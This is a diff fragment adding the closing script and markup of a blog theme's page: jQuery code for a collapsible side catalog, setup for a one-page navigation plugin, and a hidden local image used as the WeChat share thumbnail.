+    $(".catalog-toggle").click((function(e){
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    /*
+     * Doc: https://github.com/davist11/jQuery-One-Page-Nav
+     * Fork by Hux to support padding
+     */
+    async("/js/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="/img/apple-touch-icon.png" width="0" height="0">
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
